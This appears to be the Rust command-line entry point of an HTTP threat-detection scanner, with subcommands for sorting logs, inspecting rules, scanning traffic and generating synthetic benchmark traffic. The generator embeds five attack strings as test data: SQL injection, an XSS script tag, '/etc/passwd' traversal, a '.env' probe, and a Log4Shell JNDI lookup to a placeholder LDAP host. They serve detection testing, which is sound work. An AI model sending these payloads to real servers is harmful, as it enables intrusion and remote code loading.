use anyhow::{Result, ensure};
use clap::{Parser, Subcommand, ValueEnum};
use http_detection_agent::{
    catalog::{Catalog, Profile},
    engine::{Engine, Matcher},
    scan::{self, Config},
};
use std::{
    fs::{File, OpenOptions},
    io::{BufWriter, Write},
    path::PathBuf,
};

#[derive(Parser)]
#[command(
    version,
    about = "Parallel, bounded HTTP threat detection from NDJSON, gzip, or zstd"
)]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Stable external sort for exact aggregate evaluation of unsorted large files.
    SortByTime {
        input: PathBuf,
        #[arg(long)]
        output: PathBuf,
        #[arg(long)]
        summary: Option<PathBuf>,
        #[arg(long, default_value = "runtime")]
        temp_dir: PathBuf,
        #[arg(long, default_value_t = 512)]
        memory_mib: usize,
        #[arg(long, default_value_t = 1_048_576)]
        max_line_bytes: usize,
    },
    /// Validate and compile the catalog; print coverage and matcher configuration.
    Inspect {
        #[command(flatten)]
        rules: Rules,
    },
    /// Stream one or more files (or '-' for stdin) through the detection engine.
    Scan(Scan),
    /// Generate deterministic synthetic benchmark traffic, streamed with bounded memory.
    Generate {
        #[arg(long)]
        output: PathBuf,
        #[arg(long, default_value_t = 1_000_000)]
        records: u64,
        #[arg(long, default_value_t = 100)]
        attack_every: u64,
        #[arg(long, default_value_t = 0)]
        padding: usize,
    },
}

#[derive(clap::Args)]
struct Rules {
    #[arg(long, default_value = "rules/http-attacks.json")]
    catalog: PathBuf,
    /// Additional attributed rules; duplicate IDs or conflicting sources are rejected.
    #[arg(long)]
    overlay: Vec<PathBuf>,
    /// Default enables only production rules. Use all for every catalog rule.
    #[arg(long, default_value = "production", value_parser = ["production", "test", "experimental", "all"])]
    status: String,
    #[arg(long)]
    profile: Option<PathBuf>,
    #[arg(long)]
    events_only: bool,
    /// Plain precompiled Regex evaluation or grouped RegexSet with predicate caching.
    #[arg(long, value_enum, default_value = "grouped")]
    matcher: Matcher,
}

#[derive(Clone, Copy, ValueEnum)]
enum TimeUnit {
    Ns,
    Us,
    Ms,
    S,
}
#[derive(Clone, Copy, ValueEnum)]
enum LatePolicy {
    Error,
    Drop,
}
#[derive(Clone, Copy, ValueEnum)]
enum InvalidPolicy {
    Error,
    Skip,
}

#[derive(clap::Args)]
struct Scan {
    #[arg(required = true)]
    inputs: Vec<PathBuf>,
    #[command(flatten)]
    rules: Rules,
    #[arg(long, default_value_t = 0)]
    threads: usize,
    #[arg(long, default_value_t = 4)]
    batch_mib: usize,
    #[arg(long, default_value_t = 1_048_576)]
    max_line_bytes: usize,
    #[arg(long, default_value_t = 4096)]
    max_key_bytes: usize,
    #[arg(long, default_value_t = 1_000_000)]
    max_window_entries: usize,
    /// Accounted window-state budget, separate from parsing and output buffers.
    #[arg(long, default_value_t = 1024)]
    state_mib: usize,
    #[arg(long, default_value_t = 200_000)]
    max_groups: usize,
    #[arg(long, default_value_t = 200_000)]
    max_pending: usize,
    #[arg(long, default_value_t = 0)]
    lateness_seconds: u64,
    #[arg(long, value_enum, default_value = "error")]
    late_policy: LatePolicy,
    #[arg(long, value_enum, default_value = "error")]
    invalid_policy: InvalidPolicy,
    /// Unit of integer timestamps. RFC3339 and UTC SQL timestamps are also accepted.
    #[arg(long, value_enum, default_value = "ns")]
    timestamp_unit: TimeUnit,
    /// New findings file. Omit for stdout. Existing files are never overwritten.
    #[arg(short, long)]
    output: Option<PathBuf>,
    /// New JSON summary file; summary is always written to stderr as well.
    #[arg(long)]
    summary: Option<PathBuf>,
    /// Count matches without serializing individual findings; aggregate semantics stay enabled.
    #[arg(long)]
    counts_only: bool,
    #[arg(long)]
    quiet: bool,
}

fn load(r: &Rules) -> Result<(Engine, Vec<http_detection_agent::catalog::Excluded>)> {
    let mut catalog = Catalog::load(&r.catalog)?;
    for path in &r.overlay {
        let extra = Catalog::load(path)?;
        for source in extra.sources {
            if let Some(existing) = catalog.sources.iter().find(|s| s["id"] == source["id"]) {
                ensure!(
                    existing == &source,
                    "conflicting source in overlay {}",
                    path.display()
                );
            } else {
                catalog.sources.push(source);
            }
        }
        for rule in extra.rules {
            ensure!(
                !catalog.rules.iter().any(|r| r.id == rule.id),
                "duplicate overlay rule {}",
                rule.id
            );
            catalog.rules.push(rule);
        }
    }
    let profile: Option<Profile> = r
        .profile
        .as_ref()
        .map(|p| -> Result<_> { Ok(serde_json::from_reader(File::open(p)?)?) })
        .transpose()?;
    let excluded = catalog.select(&r.status, r.events_only, profile.as_ref());
    ensure!(!catalog.rules.is_empty(), "no rules selected");
    Ok((Engine::compile_with_matcher(catalog, r.matcher)?, excluded))
}

fn create(path: &PathBuf) -> Result<BufWriter<File>> {
    Ok(BufWriter::with_capacity(
        1 << 20,
        OpenOptions::new().write(true).create_new(true).open(path)?,
    ))
}

fn main() -> Result<()> {
    match Cli::parse().command {
        Command::SortByTime {
            input,
            output,
            summary,
            temp_dir,
            memory_mib,
            max_line_bytes,
        } => {
            let mut summary_file = summary.as_ref().map(create).transpose()?;
            let bytes = memory_mib
                .checked_mul(1 << 20)
                .ok_or_else(|| anyhow::anyhow!("sort memory overflow"))?;
            let result = http_detection_agent::sort::sort(
                &input,
                &output,
                &temp_dir,
                bytes,
                max_line_bytes,
            )?;
            if let Some(out) = summary_file.as_mut() {
                serde_json::to_writer_pretty(&mut *out, &result)?;
                out.write_all(b"\n")?;
                out.flush()?;
            }
            eprintln!("{}", serde_json::to_string(&result)?);
        }
        Command::Inspect { rules } => {
            let (engine, excluded) = load(&rules)?;
            println!(
                "{}",
                serde_json::to_string_pretty(
                    &serde_json::json!({"matcher":engine.matcher,"event_rules":engine.events.len(),"aggregate_rules":engine.aggregates.len(),"unique_predicates":engine.predicates.len(),"regex_scan_groups":if engine.matcher == Matcher::Grouped {engine.groups.len()} else {0},"normalized_field_slots":engine.slots.len(),"projection":engine.fields,"excluded_rules":excluded})
                )?
            );
        }
        Command::Scan(s) => {
            ensure!(
                s.batch_mib > 0 && s.batch_mib <= 256,
                "--batch-mib must be 1..256"
            );
            ensure!(
                s.max_line_bytes > 0 && s.max_line_bytes <= 64 << 20,
                "--max-line-bytes must be 1..67108864"
            );
            ensure!(
                s.max_groups > 0
                    && s.max_window_entries > 0
                    && s.max_pending > 0
                    && s.max_key_bytes > 0,
                "state limits must be positive"
            );
            ensure!(
                s.inputs.iter().filter(|p| p.as_os_str() == "-").count() <= 1,
                "stdin may appear only once"
            );
            let lateness_ns = i64::try_from(s.lateness_seconds)?
                .checked_mul(1_000_000_000)
                .ok_or_else(|| anyhow::anyhow!("lateness overflow"))?;
            let (engine, excluded) = load(&s.rules)?;
            let threads = if s.threads == 0 {
                std::thread::available_parallelism()?.get()
            } else {
                s.threads
            };
            ensure!(threads <= 256, "--threads must be at most 256");
            let mut out: Box<dyn Write> = if s.counts_only {
                ensure!(
                    s.output.is_none(),
                    "--counts-only cannot be combined with --output"
                );
                Box::new(std::io::sink())
            } else if let Some(path) = &s.output {
                Box::new(create(path)?)
            } else {
                Box::new(BufWriter::new(std::io::stdout()))
            };
            let mut summary_file = s.summary.as_ref().map(create).transpose()?;
            let config = Config {
                inputs: s.inputs,
                threads,
                batch_bytes: s.batch_mib << 20,
                max_line_bytes: s.max_line_bytes,
                max_key_bytes: s.max_key_bytes,
                max_window_entries: s.max_window_entries,
                max_state_bytes: s
                    .state_mib
                    .checked_mul(1 << 20)
                    .ok_or_else(|| anyhow::anyhow!("state budget overflow"))?,
                max_groups: s.max_groups,
                max_pending: s.max_pending,
                lateness_ns,
                drop_late: matches!(s.late_policy, LatePolicy::Drop),
                skip_invalid: matches!(s.invalid_policy, InvalidPolicy::Skip),
                timestamp_multiplier: match s.timestamp_unit {
                    TimeUnit::Ns => 1,
                    TimeUnit::Us => 1_000,
                    TimeUnit::Ms => 1_000_000,
                    TimeUnit::S => 1_000_000_000,
                },
                counts_only: s.counts_only,
                quiet: s.quiet,
            };
            let summary = scan::run(&engine, &config, excluded, out.as_mut());
            if let Some(f) = summary_file.as_mut() {
                serde_json::to_writer_pretty(&mut *f, &summary)?;
                f.write_all(b"\n")?;
                f.flush()?;
            }
            eprintln!("{}", serde_json::to_string(&summary)?);
            ensure!(
                summary.complete,
                "scan incomplete: {}",
                summary.error.as_deref().unwrap_or("unknown error")
            );
        }
        Command::Generate {
            output,
            records,
            attack_every,
            padding,
        } => {
            ensure!(padding <= 1 << 20, "padding limit is 1 MiB");
            let mut out = create(&output)?;
            let paths = [
                "/search?q=1%2520UNION%2520SELECT%2520password",
                "/?q=%3Cscript%3Ealert(1)%3C/script%3E",
                "/../../etc/passwd",
                "/.env",
                "/?x=${jndi:ldap://example.invalid/a}",
            ];
            let padding = "x".repeat(padding);
            for n in 0..records {
                let attack = attack_every > 0 && n % attack_every == 0;
                let uri = if attack {
                    paths[(n / attack_every) as usize % paths.len()]
                } else {
                    "/products?page=2"
                };
                // Advancing event time and rotating fictional identities keep window state realistic and bounded.
                let timestamp = 1_780_000_000_000_000_000u64
                    .checked_add(
                        n.checked_mul(1_000_000)
                            .ok_or_else(|| anyhow::anyhow!("record count overflow"))?,
                    )
                    .ok_or_else(|| anyhow::anyhow!("timestamp overflow"))?;
                let event = serde_json::json!({"EdgeEndTimestamp":timestamp,"ClientIP":format!("192.0.2.{}", n % 200 + 1),"ClientRequestHost":"shop.example.invalid","ClientRequestMethod":"GET","ClientRequestURI":uri,"ClientRequestPath":uri.split('?').next().unwrap(),"ClientRequestUserAgent":"Mozilla/5.0","EdgeResponseStatus":if attack {404} else {200},"RequestHeaders":{"Accept":"text/html"},"benchmark_padding":padding});
                serde_json::to_writer(&mut out, &event)?;
                out.write_all(b"\n")?;
            }
            out.flush()?;
        }
    }
    Ok(())
}
